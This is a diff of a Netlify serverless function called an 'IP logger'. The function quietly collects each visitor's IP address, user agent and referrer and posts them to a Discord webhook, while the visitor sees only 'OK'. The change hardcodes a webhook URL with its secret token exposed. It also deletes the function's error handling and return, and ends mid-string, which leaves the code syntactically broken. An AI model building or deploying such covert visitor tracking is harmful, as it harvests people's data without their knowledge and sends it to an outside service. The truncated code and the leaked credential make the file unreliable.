@@ -1,10 +1,10 @@
-// netlify/functions/ip-logger-discord.js (V3 - The Nuclear Option)
+// netlify/functions/ip-logger-discord.js (V4 - The Last Resort)
 
 exports.handler = async (event, context) => {
     const clientIp = event.headers['x-forwarded-for'] || event.headers['cf-connecting-ip'] || 'UNKNOWN';
     const userAgent = event.headers['user-agent'] || 'N/A';
     const referrer = event.headers['referer'] || 'N/A';
-    
+
     const logData = {
         timestamp: new Date().toISOString(),
         ip_address: clientIp,
@@ -31,13 +31,8 @@ exports.handler = async (event, context) => {
         ]
     };
 
-    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-
-    if (!webhookUrl) {
-        // This is a hard, explicit failure log.
-        console.error("!!! LOGGING FAILURE !!! Webhook URL is missing in environment variables.");
-        return { statusCode: 500, body: "Internal Error: Config Missing" };
-    }
+    // !!! CRITICAL FAILURE POINT: The webhook URL is now hardcoded. !!!
+    const webhookUrl = 'https://discord.com/api/webhooks/1508453448100741171/8MPtC2QPhiGPjD1RR2mVEEC1dkJGiUAe0w761Xv7Xj5vhkF1dEhQydFrf-tGmG52K52t';
 
     try {
         console.log("Attempting to send payload to Discord...");
@@ -49,26 +44,6 @@ exports.handler = async (event, context) => {
             body: JSON.stringify(discordPayload)
         });
         
-        // Check for HTTP status codes that are NOT 200/204
         if (!response.ok) {
-             // If the API returns an error (e.g., 400 Bad Request, 429 Rate Limit)
              const errorText = await response.text();
-             console.error(`!!! LOGGING FAILURE !!! Discord API rejected request. Status: ${response.status}. Details: ${errorText}`);
-             // Return a failure state to the client, but keep it clean.
-             return { statusCode: 500, body: "Logging Error" };
-        }
-        
-        console.log("SUCCESS: Data sent to Discord.");
-
-    } catch (error) {
-        // This catches network failures (DNS, timeout, etc.)
-        console.error(`!!! LOGGING FAILURE !!! Critical network or runtime error: ${error.message}`);
-    }
-
-    // Always return the clean success response to the client.
-    return {
-        statusCode: 200,
-        headers: { 'Content-Type': 'text/plain' },
-        body: 'OK'
-    };
-};
+             console.error(`!!! LOGGING FAILURE !!! Discord API rejected request
